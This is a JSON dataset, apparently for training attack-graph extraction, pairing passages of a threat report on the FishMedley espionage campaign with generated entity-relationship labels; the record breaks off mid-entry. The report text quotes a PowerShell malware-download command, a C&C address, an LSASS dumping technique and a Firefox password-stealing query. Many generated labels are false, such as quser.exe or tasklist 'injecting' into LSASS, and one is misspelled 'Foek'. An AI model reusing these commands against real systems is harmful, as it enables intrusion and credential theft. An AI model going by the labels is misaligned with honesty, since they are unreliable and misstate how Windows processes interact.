[
    {
        "phase": "initial access",
        "content": "We were unable to identify the initial compromise vectors. For most cases, the attackers seemed to have had privileged access inside the local network, such as domain administrator credentials.\nAt Victim D, the attackers gained access to an admin console and used it to deploy implants on other machines in the local network. It is probable that they first compromised the machine of a sysadmin or security analyst and then stole credentials that allowed them to connect to the console.\nAt Victim F, the implants were delivered usingImpacket, which means that the attackers somehow previously compromised a high-privilege domain account.",
        "relationship": "[CoT]: The provided text does not contain specific instances of processes, files, sockets, or registry keys interacting with each other. It describes general attack methods and compromise scenarios but lacks concrete details of entity interactions.",
        "semantic_relationship": "[CoT]: The description provides a high-level overview of attack techniques but does not specify explicit interactions between system entities. In cases where the original relationships cannot be mapped to system-level equivalents, it is appropriate to label them as \"Unknown\" to maintain clarity and flexibility for further analysis. The \"Unknown\" relationship indicates that the attack method involves some interaction between system entities, but the specific type of interaction cannot be accurately classified at this level of abstraction. This approach allows for more detailed analysis and classification as additional information becomes available."
    },
    {
        "phase": "lateral movement",
        "content": "At Victim F, the operators also used Impacket to move laterally. They gathered information on other local machines and installed implants.\nTable 3 shows that the operators first did some manual reconnaissance usingquser.exe,wmic.exe, andipconfig.exe. Then they tried to get credentials and other secrets bydumpingthe local security authority subsystem service (LSASS) process (PID 944). The PID of the process was obtained viatasklist /svcand the dump was performed usingcomsvcs.dll, which is a known living-off-the-land binary (LOLBIN). Note that it is likely that the attackers executedquser.exeto see whether other users or admins were also logged in, meaning privileged accesses were present in LSASS. According toMicrosoft documentation, to use this command the attacker must have Full Control permission or special access permission.\nThey also saved the registry hivessam.hiveandsystem.hive, which can both contain secrets or credentials.\nFinally, they tried to dump the LSASS process again, using aforloop iterating over the output fromtasklist.exe. We have seen this same code used on other machines, so it is a good idea to block or at least alert on it.\nTable 3. Commands executed via Impacket on a machine at Victim F",
        "relationship": "1. [CoT]: The text states that the operators used Impacket to execute quser.exe for manual reconnaissance.   [Relationships]: <process:Impacket, used, process:quser.exe>. \n2. [CoT]: The operators also used Impacket to run wmic.exe for manual reconnaissance.   [Relationships]: <process:Impacket, used, process:wmic.exe>. \n3. [CoT]: The operators executed ipconfig.exe for manual reconnaissance using Impacket.   [Relationships]: <process:Impacket, used, process:ipconfig.exe>. \n4. [CoT]: The text mentions that the attackers executed quser.exe to see if other users or admins were logged in, implying interaction with the LSASS process.   [Relationships]: <process:quser.exe, interacted with, process:LSASS (PID 944)>. \n5. [CoT]: The attackers obtained the LSASS process PID (944) using tasklist /svc.   [Relationships]: <process:tasklist /svc, obtained, process:LSASS (PID 944)>. \n6. [CoT]: The operators performed a dump action on the LSASS process (PID 944) using comsvcs.dll.   [Relationships]: <process:comsvcs.dll, performed, process:LSASS (PID 944)>. \n7. [CoT]: The attackers saved the registry hive sam.hive, which can contain secrets or credentials.   [Relationships]: <process:attackers, saved, file:sam.hive>. \n8. [CoT]: The attackers saved the registry hive system.hive, which can contain secrets or credentials.   [Relationships]: <process:attackers, saved, file:system.hive>. \n9. [CoT]: The text describes a for loop iterating over the output from tasklist.exe to dump the LSASS process again.   [Relationships]: <process:for loop, used, process:tasklist.exe>. \n10. [CoT]: The for loop was used to dump the LSASS process, indicating a process-to-process relationship.   [Relationships]: <process:for loop, dumped, process:LSASS process>. ",
        "semantic_relationship": "[CoT]: The original relationship states that Impacket \"used\" quser.exe, which implies that Impacket executed the quser.exe file. In system-level terms, this translates to an Fork relationship from Impacket to quser.exe. [System-level Relationships]: <process:Impacket,Fork,process:quser.exe>. \n[CoT]: The original relationship \"used\" implies that Impacket initiated or spawned the wmic.exe process, which corresponds to the system-level \"Fork\" relationship between processes. This indicates that Impacket executed wmic.exe as part of its operations. [System-level Relationships]: <process:Impacket,Fork,process:wmic.exe>. \n[CoT]: The original relationship \"used\" implies that the Impacket process executed the ipconfig.exe process, which aligns with the system-level relationship \"Fork\" between two processes. [System-level Relationships]: <process:Impacket,Fork,process:ipconfig.exe>. \n[CoT]: The original relationship \"interacted with\" is too general. In the context of interacting with the LSASS process, the most likely system-level interaction is injection, as quser.exe would need to inject code into LSASS to extract user information. [System-level Relationships]: <process:quser.exe,Inject,process:LSASS (PID 944)>. \n[CoT]: The original relationship states that tasklist /svc \"obtained\" the LSASS process PID (944). In system-level terms, this implies that tasklist /svc read the process ID from LSASS's memory, which corresponds to the \"Inject\" relationship between processes. [System-level Relationships]: <process:tasklist /svc,Inject,process:LSASS (PID 944)>. \n[CoT]: The original relationship states that comsvcs.dll \"performed\" an action on the LSASS process. In the context of dumping memory from LSASS, the appropriate system-level relationship is \"Inject\". This aligns with the system-level relationship framework where one process injects code or data into another process memory space. [System-level Relationships]: <process:comsvcs.dll,Inject,process:LSASS (PID 944)>. \n[CoT]: The original relationship \"saved\" implies that the attackers wrote data to the file \"sam.hive\", which corresponds to the system-level relationship \"Write\" between a process and a file. [System-level Relationships]: <process:attackers,Write,file:sam.hive>. \n[CoT]: The original relationship \"saved\" implies that the attackers wrote data to the file system.hive, which aligns with the system-level relationship \"Write\" for Process-to-File interactions. [System-level Relationships]: <process:attackers,Write,file:system.hive>. \n[CoT]: The for loop is using the output from tasklist.exe, which implies it is reading data from tasklist.exe's output stream. Therefore, the system-level relationship is \"Read\" between the for loop process and tasklist.exe. [System-level Relationships]: <process:for loop,Read,process:tasklist.exe>. \n[CoT]: The term \"dumped\" in the original relationship implies that the for loop process injected code into the LSASS process to extract sensitive data, which aligns with the system-level \"Inject\" relationship between processes. [System-level Relationships]: <process:for loop,Inject,process:LSASS process>. "
    },
    {
        "phase": "command and control",
        "content": "ShadowPad is a well-known and privately sold modular backdoor, known to only be supplied to China-aligned APT groups, includingFishMongerandSparklingGoblin, as documented bySentinelOne. In Operation FishMedley, the attackers used a ShadowPad version packed withScatterBee.\nAt Victim D, the loader was downloaded using the following PowerShell command:\npowershell (new-object System.Net.WebClient).DownloadFile(\"http://<victim's_web_server_IP_address>/Images/menu/log.dll\";\"c:\\users\\public\\log.dll\")\nThis shows that the attackers compromised a web server at the victim's organization to use it as a staging server for their malware.\nAt Victim F, Firefox was used to download the loader, fromhttp://5.188.230[.]47/log.dll. We don't know whether attackers had interactive access to the machine, whether another piece of malware was running in the Firefox process, or whether the victim was redirected to the download page, say via a watering-hole attack.\nlog.dllis side-loaded by an old Bitdefender executable (original name:BDReinit.exe) and loads ShadowPad from a file namedlog.dll.dat, which can be decrypted using the scripts provided in PwC'sGitHubrepository.\nWe did not recover thelog.dll.datfrom the victim's machine, but we found a fake Adobe Flash installer onVirusTotalwith the identicallog.dllfile. The configuration of the ShadowPad payload is provided in Table 4.\nTable 4. ShadowPad configuration\nNote that from March 20th, 2022 to November 2nd, 2022, the C&C domain resolved to213.59.118[.]124, which is mentioned in a VMwareblogpostabout ShadowPad.",
        "relationship": "1. [CoT]: The text states that Firefox was used to download the loader from http://5.188.230[.]47/log.dll, indicating a process-to-socket relationship where Firefox performs the action of downloading.   [Relationships]: <process:Firefox,download,socket:http://5.188.230[.]47/log.dll>. \n2. [CoT]: The text mentions that log.dll is side-loaded by an old Bitdefender executable BDReinit.exe, showing a process-to-file relationship where BDReinit.exe performs the action of loading log.dll.   [Relationships]: <process:BDReinit.exe,loads,file:log.dll>. \n3. [CoT]: The text states that log.dll loads ShadowPad from a file named log.dll.dat, indicating a process-to-file relationship where log.dll performs the action of loading ShadowPad. [Relationships]: <process:log.dll,loads,file:log.dll.dat>. ",
        "semantic_relationship": "[CoT]: The original relationship describes Firefox downloading a file from a socket (URL), which in system-level terms translates to a 'Receive' action from a socket. Downloading implies receiving data over a network connection. [System-level Relationships]: <process:Firefox,Receive,socket:http://5.188.230[.]47/log.dll>. \n[CoT]: The original relationship indicates that BDReinit.exe loads log.dll, which in system-level terms corresponds to the \"Loadlibrary\" action, as it involves a process loading a dynamic link library (DLL) file. [System-level Relationships]: <process:BDReinit.exe,Loadlibrary,file:log.dll>. \n[CoT]: The original relationship describes a process loading another file, which in system-level terms corresponds to the 'Loadlibrary' action, as it involves one process loading a library or module from a file. [System-level Relationships]: <process:log.dll,Loadlibrary,file:log.dll.dat>. "
    },
    {
        "phase": "command and control",
        "content": "At Victim D, we detected another backdoor typically used by FishMonger: Spyder, a modular implant that was analyzed in great detail byDr.Web.\nA Spyder loader was downloaded fromhttp://<a_victim's_web_server_IP_address>/Images/menu/aa.docand dropped toC:\\Users\\Public\\task.exearound 18 hours after ShadowPad was installed.\nThe loader – see Figure 2; reads the filec:\\windows\\temp\\guid.datand decrypts its contents using AES-CBC. The encryption key is hardcoded:F4 E4 C6 9E DE E0 9E 82 00 00 00 00 00 00 00 00. The initialization vector (IV) is the first eight bytes of the key. Unfortunately, we were unable to recover theguid.datfile.\nThen, the loader injects the decoded content – likely shellcode – into itself (task.exeprocess) as seen in Figure 3.\nDespite not obtaining the encrypted final payload, our product did detect a Spyder payload in memory and it was almost identical to the Spyder variant documented by Dr.Web. The C&C server was hardcoded to61.238.103[.]165.\nInterestingly, multiple subdomains ofjunlper[.]com, a known Spyder C&C domain and a weak homoglyph domain tojuniper.net, resolved to61.238.103[.]165in 2022.\nA self-signed TLS certificate was present on port 443 of the server from May to December 2022, with the thumbprint89EDCFFC66EDA3AEB75E140816702F9AC73A75F0. According toSentinelOne, it is a certificate used by FishMonger for its C&C servers.",
        "relationship": "1. [CoT]: The text states that the Spyder loader was downloaded from a specific URL, indicating a process-to-socket relationship. [Relationships]: <process:Spyder loader,downloaded from,socket:http://<a_victim's_web_server_IP_address>/Images/menu/aa.doc>. \n2. [CoT]: The text mentions that the loader reads the file guid.dat, indicating a process-to-file relationship. [Relationships]: <process:Spyder loader,reads,file:c:\\windows\\temp\\guid.dat>. \n3. [CoT]: The loader decrypts the contents of guid.dat using a hardcoded encryption key, indicating a process-to-file relationship. [Relationships]: <process:Spyder loader,decrypts,file:encryption key>. \n4. [CoT]: The loader injects decoded content into itself (task.exe process), indicating a process-to-process relationship. [Relationships]: <process:Spyder loader,injects into,process:task.exe>. \n5. [CoT]: The product detected a Spyder payload in memory, indicating a process-to-file relationship. [Relationships]: <process:our product,detected,file:Spyder payload>. \n6. [CoT]: The C&C server is hardcoded to a specific IP address, indicating a process-to-socket relationship. [Relationships]: <process:Spyder,hardcoded to,socket:61.238.103[.]165>. \n7. [CoT]: Multiple subdomains of junlper.com resolved to the same IP address, indicating a process-to-socket relationship. [Relationships]: <process:Spyder,resolved to,socket:61.238.103[.]165>. \n8. [CoT]: The server has a self-signed TLS certificate with a specific thumbprint, indicating a process-to-file relationship. [Relationships]: <process:server,has,file:TLS certificate>. ",
        "semantic_relationship": "[CoT]: The original relationship \"downloaded from\" implies that the Spyder loader process established a connection to a remote socket (URL) to download content. In system-level terms, this is best represented as a \"Connect\" relationship between the process and the socket. [System-level Relationships]: <process:Spyder loader,Connect,socket:http://<a_victim's_web_server_IP_address>/Images/menu/aa.doc>. \n[CoT]: The original relationship describes a process (Spyder loader) reading a file (guid.dat). According to the conversion rules, this corresponds to the system-level relationship 'Read' between a process and a file. [System-level Relationships]: <process:Spyder loader,Read,file:c:\\windows\\temp\\guid.dat>. \n[CoT]: The original relationship describes the Spyder loader decrypting data from a file (guid.dat) using an encryption key. In system-level terms, this action corresponds to the process reading the encryption key from the file, as the loader must first access and retrieve the key before performing the decryption. The original relationship is therefore converted to <process:Spyder loader,Read,file:encryption key>. [System-level Relationships]: <process:Spyder loader,Read,file:encryption key>. \n[CoT]: The original relationship states that the Spyder loader injects content into the task.exe process. In system-level terms, this corresponds to the \"Inject\" relationship between two processes. This is a clear case of code injection where one process forces another process to execute its code, which aligns with the Process-to-Process:Inject relationship in the framework. [System-level Relationships]: <process:Spyder loader,Inject,process:task.exe>. \n[CoT]: The original relationship states that our product \"detected\" a Spyder payload in memory, which implies that the product inspected or read the payload file to detect it. Therefore, the system-level relationship is \"Read\" as it involves accessing the contents of the file. [System-level Relationships]: <process:our product,Read,file:Spyder payload>. \n[CoT]: The original relationship \"hardcoded to\" implies that the Spyder process is explicitly connecting to the specified IP address, which aligns with the system-level relationship \"Connect\" between a process and a socket. [System-level Relationships]: <process:Spyder,Connect,socket:61.238.103[.]165>. \n[CoT]: The original relationship \"resolved to\" indicates that the process Spyder established a connection to the socket 61.238.103[.]165, which aligns with the system-level relationship \"Connect\" between a process and a socket. [System-level Relationships]: <process:Spyder,Connect,socket:61.238.103[.]165>. \n[CoT]: The original relationship states that the server \"has\" a TLS certificate, which implies that the process is using the file (certificate) for TLS communication. In system-level terms, this translates to a \"Use\" relationship between the process and the file. [System-level Relationships]: <process:server,Use,file:TLS certificate>. "
    },
    {
        "phase": "execution",
        "content": "SodaMaster is a backdoor that was documented byKasperskyin 2021. APT10 was the first group known to have access to this backdoor but Operation FishMedley indicates that it may now be shared among multiple China-aligned APT groups.\nSodaMaster can only be found decrypted in memory and that's where we detected it. Even though we did not recover the full loading chain, we have identified a few samples that are the first step of the chain.\nWe found six different malicious DLLs that are abusing legitimate executables viaDLL side-loading. They all implement the same decryption and injection routine.\nFirst, the loader reads a hardcoded file, for exampledebug.png, and XOR decrypts it using a hardcoded 239-byte key. Table 5 summarizes the different loaders. Note that the XOR key is also different in each sample, but too long to be included in the table. Also note that we did not recover any of these encrypted payloads.\nTable 5. SodaMaster loaders\nThen, the decrypted buffer is injected into a newly created, suspendedsvchost.exeprocess – see Figure 4.\nFinally, the shellcode is executed using eitherCreateRemoteThread(on Windows XP or older versions) or, on newer Windows versions, viaNtCreateThreadExas shown in Figure 5.\nThe last four loaders in Table 5 have additional features:\nThey have an export namedgetAllAuthDatathat implements a password stealer for Firefox. It reads the Firefox SQLite database and runs the querySELECT encryptedUsername, encryptedPassword, hostname,httpRealm FROM moz_logins. \nThe last three loaders persist as a service namedNetlock,MsKeyboardFiltersrv, anddownmap, respectively.\nAs mentioned above, the SodaMaster payload was publicly analyzed by Kaspersky and the samples we've found don't seem to have evolved much. They still implement the same four backdoor commands (d,f,l, ands) that were present in 2021.\nTable 6 shows the configurations from the four different SodaMaster payloads that we identified. Operators used a different C&C server per victim, but we can see that Victims B and C share the same hardcoded RSA key.\nTable 6. SodaMaster configuration",
        "relationship": "1. [CoT]: The text states that the loader reads a hardcoded file named \"debug.png\" and XOR decrypts it, indicating a process-to-file relationship where the loader is the process reading the file.   [Relationships]: <process:loader,reads,file:debug.png>. \n2. [CoT]: The loader decrypts the buffer and injects it into a newly created, suspended svchost.exe process, showing a process-to-process relationship where the loader is the process injecting into svchost.exe.   [Relationships]: <process:loader,injects,process:svchost.exe>. \n3. [CoT]: The shellcode is executed in the context of svchost.exe, indicating a process-to-process relationship where the loader is the process executing the shellcode.   [Relationships]: <process:loader,executes,process:shellcode>. \n4. [CoT]: The shellcode reads the Firefox SQLite database as part of a password stealer, showing a process-to-file relationship where the shellcode is the process reading the database file.   [Relationships]: <process:shellcode,reads,file:Firefox SQLite database>. \n5. [CoT]: The shellcode runs a query on the Firefox database, indicating a process-to-file relationship where the shellcode is the process running the query on the database file.   [Relationships]: <process:shellcode,runs,file:moz_logins query>. ",
        "semantic_relationship": "[CoT]: The original relationship indicates that the loader reads the file \"debug.png\". In system-level terms, this corresponds to the \"Read\" action between a process and a file. [System-level Relationships]: <process:loader,Read,file:debug.png>. \n[CoT]: The original relationship \"injects\" indicates that the loader process is performing code injection into the svchost.exe process. In the system-level relationships framework, this corresponds to the \"Inject\" relationship between two processes. [System-level Relationships]: <process:loader,Inject,process:svchost.exe>. \n[CoT]: The original relationship \"executes\" indicates that the loader process is running or launching the shellcode, which directly maps to the system-level relationship \"Fork\" between processes. [System-level Relationships]: <process:loader,Fork,process:shellcode>. \n[CoT]: The original relationship indicates that the shellcode is reading the Firefox SQLite database file. In the system-level relationships framework, this corresponds to the 'Read' action between a process and a file. [System-level Relationships]: <process:shellcode,Read,file:Firefox SQLite database>. \n[CoT]: The original relationship states that the shellcode \"runs\" a query on the Firefox database. In system-level terms, this action involves reading data from the database file, hence the relationship is converted to \"Read\". The shellcode is the process performing the read operation on the file. [System-level Relationships]: <process:shellcode,Read,file:moz_logins query>. "
    },
    {
        "phase": "command and control",
        "content": "At Victim D, we captured a previously unknown implant in the same process where Spyder was running. It was probably loaded from disk or downloaded by Spyder. Because its DLL export name wasrcmd64.dll, we named this implant RPipeCommander.\nRPipeCommander is multithreaded and usesIoCompletionPortto manage the I/O requests of the multiple threads. It creates the named pipe\\\\.\\Pipe\\CmdPipe<PID>, where<PID>is the current process ID, and reads from and writes into this pipe.\nRPipeCommander is a reverse shell that accepts three commands via the named pipe:\nh(0x68): create acmd.exeprocess and bind pipes to the process to send commands and read the output. \ni(0x69): Write a command in the existingcmd.exeprocess or read the output of the previous command. \nj(0x6A): exit thecmd.exeprocess by writingexit\\r\\nin the command shell.\nNote that it seems we only have the server side of RPipeCommander. It is likely that a second component, a client, is used to send commands to the server from another machine on the local network.\nFinally, RPipeCommander is written in C++ and RTTI information was included in the captured samples, allowing us to obtain some of the class names:\nCPipeServer \nCPipeBuffer \nCPipeSrvEvent \nCPipeServerEventHandler",
        "relationship": "1. [CoT]: RPipeCommander creates the named pipe \\\\.\\Pipe\\CmdPipe<PID>, indicating a process-to-file relationship where the process creates the pipe file. [Relationships]: <process:RPipeCommander,creates,file:\\\\.\\Pipe\\CmdPipe<PID>>. \n2. [CoT]: RPipeCommander reads from the named pipe \\\\.\\Pipe\\CmdPipe<PID>, indicating a process-to-file relationship where the process reads from the pipe file. [Relationships]: <process:RPipeCommander,reads from,file:\\\\.\\Pipe\\CmdPipe<PID>>. \n3. [CoT]: RPipeCommander writes into the named pipe \\\\.\\Pipe\\CmdPipe<PID>, indicating a process-to-file relationship where the process writes to the pipe file. [Relationships]: <process:RPipeCommander,writes into,file:\\\\.\\Pipe\\CmdPipe<PID>>. \n4. [CoT]: RPipeCommander accepts commands via the named pipe \\\\.\\Pipe\\CmdPipe<PID>, indicating a process-to-file relationship where the process accepts commands from the pipe file. [Relationships]: <process:RPipeCommander,accepts,file:\\\\.\\Pipe\\CmdPipe<PID>>. \n5. [CoT]: RPipeCommander creates a process 'cmd.exe' , indicating a process-to-process relationship where the process creates the other process. [Relationships]: <process:RPipeCommander,creates,process:cmd.exe>. \n6. [CoT]: RPipeCommander binds pipes to the process 'cmd.exe' , indicating a process-to-process relationship where the process binds pipes to the other process. [Relationships]: <process:RPipeCommander,binds,process:cmd.exe>. \n7. [CoT]: RPipeCommander sends commands to the 'cmd.exe' process, indicating a process-to-process relationship where the process sends commands to the other process. [Relationships]: <process:RPipeCommander,sends,process:cmd.exe>. \n8. [CoT]: RPipeCommander reads the output of the 'cmd.exe' process, indicating a process-to-process relationship where the process reads from the other process. [Relationships]: <process:RPipeCommander,reads,process:cmd.exe>. \n9. [CoT]: RPipeCommander exits the 'cmd.exe' process by writing 'exit\\r\\n' , indicating a process-to-process relationship where the process exits the other process. [Relationships]: <process:RPipeCommander,exits,process:cmd.exe>. ",
        "semantic_relationship": "[CoT]: The original relationship describes a process creating a named pipe, which is a form of inter-process communication mechanism implemented as a file. In system-level terms, this corresponds to a 'Create' action between a process and a file. The named pipe is treated as a file since it is being created by the process. [System-level Relationships]: <process:RPipeCommander,Create,file:\\\\.\\Pipe\\CmdPipe<PID>>. \n[CoT]: The original relationship describes a process reading from a named pipe, which is a form of inter-process communication (IPC) mechanism. In system-level terms, this corresponds to a \"Read\" action between a process and a file, as the process is consuming data from the pipe file. [System-level Relationships]: <process:RPipeCommander,Read,file:\\\\.\\Pipe\\CmdPipe<PID>>. \n[CoT]: The original relationship describes a process (RPipeCommander) writing data into a named pipe (\\\\.\\Pipe\\CmdPipe<PID>). In system-level terms, this corresponds to a 'Write' action from a process to a file. The action is explicitly stated as 'writes into' the file, which directly maps to the system-level 'Write' relationship. [System-level Relationships]: <process:RPipeCommander,Write,file:\\\\.\\Pipe\\CmdPipe<PID>>. \n[CoT]: The original relationship indicates that the process 'RPipeCommander' accepts commands via a named pipe file. In system-level terms, this corresponds to a 'Read' operation from the pipe file, as the process is receiving data (commands) from the pipe. [System-level Relationships]: <process:RPipeCommander,Read,file:\\\\.\\Pipe\\CmdPipe<PID>>. \n[CoT]: The original relationship states that RPipeCommander creates a new process 'cmd.exe'. In system-level terms, this corresponds to a 'Fork' operation where one process spawns another. The 'Fork' relationship is used to represent process creation in the system-level framework. [System-level Relationships]: <process:RPipeCommander,Fork,process:cmd.exe>. \n[CoT]: The original relationship states that RPipeCommander \"binds pipes\" to cmd.exe. In system-level terms, this action corresponds to establishing a pipe connection between two processes, which is represented as a \"Connect\" relationship in the Process-to-Process category. [System-level Relationships]: <process:RPipeCommander,Connect,process:cmd.exe>. \n[CoT]: The original relationship states that RPipeCommander \"sends\" commands to cmd.exe, which implies establishing a connection to the process. In system-level terms, this corresponds to a \"Foek\" relationship between the two processes. [System-level Relationships]: <process:RPipeCommander,Fork,process:cmd.exe>. \n[CoT]: The original relationship indicates that RPipeCommander reads the output of cmd.exe. In system-level terms, this corresponds to a 'Read' action from one process to another. The 'reads' relationship is therefore mapped to 'Receive'. [System-level Relationships]: <process:RPipeCommander,Receive,process:cmd.exe>. \n[CoT]: The original relationship states that RPipeCommander exits the 'cmd.exe' process. In system-level terms, this action is best represented as a 'Exit' relationship between the two processes. [System-level Relationships]: <process:RPipeCommander,Exit,process:cmd.exe>. "
    },
    {
        "phase_relationship": [
            {
                "phase": "initial access",
                "relationship": "[Description]: The provided text does not contain specific instances of processes, files, sockets, or registry keys interacting with each other. It describes general attack methods and compromise scenarios but lacks concrete details of entity interactions.",
                "semantic_relationship": "[CoT]: The description provides a high-level overview of attack techniques but does not specify explicit interactions between system entities. In cases where the original relationships cannot be mapped to system-level equivalents, it is appropriate to label them as \"Unknown\" to maintain clarity and flexibility for further analysis. The \"Unknown\" relationship indicates that the attack method involves some interaction between system entities, but the specific type of interaction cannot be accurately classified at this level of abstraction. This approach allows for more detailed analysis and classification as additional information becomes available."
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The text states that the operators used Impacket to execute quser.exe for manual reconnaissance.   [Original Relationships]: <process:Impacket, used, process:quser.exe>. ",
                "semantic_relationship": "[CoT]: The original relationship states that Impacket \"used\" quser.exe, which implies that Impacket executed the quser.exe file. In system-level terms, this translates to an Fork relationship from Impacket to quser.exe. [System-level Relationships]: <process:Impacket,Fork,process:quser.exe>. "
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The operators also used Impacket to run wmic.exe for manual reconnaissance.   [Original Relationships]: <process:Impacket, used, process:wmic.exe>. ",
                "semantic_relationship": "[CoT]: The original relationship \"used\" implies that Impacket initiated or spawned the wmic.exe process, which corresponds to the system-level \"Fork\" relationship between processes. This indicates that Impacket executed wmic.exe as part of its operations. [System-level Relationships]: <process:Impacket,Fork,process:wmic.exe>. "
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The operators executed ipconfig.exe for manual reconnaissance using Impacket.   [Original Relationships]: <process:Impacket, used, process:ipconfig.exe>. ",
                "semantic_relationship": "[CoT]: The original relationship \"used\" implies that the Impacket process executed the ipconfig.exe process, which aligns with the system-level relationship \"Fork\" between two processes. [System-level Relationships]: <process:Impacket,Fork,process:ipconfig.exe>. "
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The text mentions that the attackers executed quser.exe to see if other users or admins were logged in, implying interaction with the LSASS process.   [Original Relationships]: <process:quser.exe, interacted with, process:LSASS (PID 944)>. ",
                "semantic_relationship": "[CoT]: The original relationship \"interacted with\" is too general. In the context of interacting with the LSASS process, the most likely system-level interaction is injection, as quser.exe would need to inject code into LSASS to extract user information. [System-level Relationships]: <process:quser.exe,Inject,process:LSASS (PID 944)>. "
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The attackers obtained the LSASS process PID (944) using tasklist /svc.   [Original Relationships]: <process:tasklist /svc, obtained, process:LSASS (PID 944)>. ",
                "semantic_relationship": "[CoT]: The original relationship states that tasklist /svc \"obtained\" the LSASS process PID (944). In system-level terms, this implies that tasklist /svc read the process ID from LSASS's memory, which corresponds to the \"Inject\" relationship between processes. [System-level Relationships]: <process:tasklist /svc,Inject,process:LSASS (PID 944)>. "
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The operators performed a dump action on the LSASS process (PID 944) using comsvcs.dll.   [Original Relationships]: <process:comsvcs.dll, performed, process:LSASS (PID 944)>. ",
                "semantic_relationship": "[CoT]: The original relationship states that comsvcs.dll \"performed\" an action on the LSASS process. In the context of dumping memory from LSASS, the appropriate system-level relationship is \"Inject\". This aligns with the system-level relationship framework where one process injects code or data into another process memory space. [System-level Relationships]: <process:comsvcs.dll,Inject,process:LSASS (PID 944)>. "
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The attackers saved the registry hive sam.hive, which can contain secrets or credentials.   [Original Relationships]: <process:attackers, saved, file:sam.hive>. ",
                "semantic_relationship": "[CoT]: The original relationship \"saved\" implies that the attackers wrote data to the file \"sam.hive\", which corresponds to the system-level relationship \"Write\" between a process and a file. [System-level Relationships]: <process:attackers,Write,file:sam.hive>. "
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The attackers saved the registry hive system.hive, which can contain secrets or credentials.   [Original Relationships]: <process:attackers, saved, file:system.hive>. ",
                "semantic_relationship": "[CoT]: The original relationship \"saved\" implies that the attackers wrote data to the file system.hive, which aligns with the system-level relationship \"Write\" for Process-to-File interactions. [System-level Relationships]: <process:attackers,Write,file:system.hive>. "
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The text describes a for loop iterating over the output from tasklist.exe to dump the LSASS process again.   [Original Relationships]: <process:for loop, used, process:tasklist.exe>. ",
                "semantic_relationship": "[CoT]: The for loop is using the output from tasklist.exe, which implies it is reading data from tasklist.exe's output stream. Therefore, the system-level relationship is \"Read\" between the for loop process and tasklist.exe. [System-level Relationships]: <process:for loop,Read,process:tasklist.exe>. "
            },
            {
                "phase": "lateral movement",
                "relationship": "[Description]: The for loop was used to dump the LSASS process, indicating a process-to-process relationship.   [Original Relationships]: <process:for loop, dumped, process:LSASS process>. ",
                "semantic_relationship": "[CoT]: The term \"dumped\" in the original relationship implies that the for loop process injected code into the LSASS process to extract sensitive data, which aligns with the system-level \"Inject\" relationship between processes. [System-level Relationships]: <process:for loop,Inject,process:LSASS process>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text states that Firefox was used to download the loader from http://5.188.230[.]47/log.dll, indicating a process-to-socket relationship where Firefox performs the action of downloading.   [Original Relationships]: <process:Firefox,download,socket:http://5.188.230[.]47/log.dll>. ",
                "semantic_relationship": "[CoT]: The original relationship describes Firefox downloading a file from a socket (URL), which in system-level terms translates to a 'Receive' action from a socket. Downloading implies receiving data over a network connection. [System-level Relationships]: <process:Firefox,Receive,socket:http://5.188.230[.]47/log.dll>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions that log.dll is side-loaded by an old Bitdefender executable BDReinit.exe, showing a process-to-file relationship where BDReinit.exe performs the action of loading log.dll.   [Original Relationships]: <process:BDReinit.exe,loads,file:log.dll>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that BDReinit.exe loads log.dll, which in system-level terms corresponds to the \"Loadlibrary\" action, as it involves a process loading a dynamic link library (DLL) file. [System-level Relationships]: <process:BDReinit.exe,Loadlibrary,file:log.dll>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text states that log.dll loads ShadowPad from a file named log.dll.dat, indicating a process-to-file relationship where log.dll performs the action of loading ShadowPad. [Original Relationships]: <process:log.dll,loads,file:log.dll.dat>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process loading another file, which in system-level terms corresponds to the 'Loadlibrary' action, as it involves one process loading a library or module from a file. [System-level Relationships]: <process:log.dll,Loadlibrary,file:log.dll.dat>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text states that the Spyder loader was downloaded from a specific URL, indicating a process-to-socket relationship. [Original Relationships]: <process:Spyder loader,downloaded from,socket:http://<a_victim's_web_server_IP_address>/Images/menu/aa.doc>. ",
                "semantic_relationship": "[CoT]: The original relationship \"downloaded from\" implies that the Spyder loader process established a connection to a remote socket (URL) to download content. In system-level terms, this is best represented as a \"Connect\" relationship between the process and the socket. [System-level Relationships]: <process:Spyder loader,Connect,socket:http://<a_victim's_web_server_IP_address>/Images/menu/aa.doc>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions that the loader reads the file guid.dat, indicating a process-to-file relationship. [Original Relationships]: <process:Spyder loader,reads,file:c:\\windows\\temp\\guid.dat>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (Spyder loader) reading a file (guid.dat). According to the conversion rules, this corresponds to the system-level relationship 'Read' between a process and a file. [System-level Relationships]: <process:Spyder loader,Read,file:c:\\windows\\temp\\guid.dat>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The loader decrypts the contents of guid.dat using a hardcoded encryption key, indicating a process-to-file relationship. [Original Relationships]: <process:Spyder loader,decrypts,file:encryption key>. ",
                "semantic_relationship": "[CoT]: The original relationship describes the Spyder loader decrypting data from a file (guid.dat) using an encryption key. In system-level terms, this action corresponds to the process reading the encryption key from the file, as the loader must first access and retrieve the key before performing the decryption. The original relationship is therefore converted to <process:Spyder loader,Read,file:encryption key>. [System-level Relationships]: <process:Spyder loader,Read,file:encryption key>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The loader injects decoded content into itself (task.exe process), indicating a process-to-process relationship. [Original Relationships]: <process:Spyder loader,injects into,process:task.exe>. ",
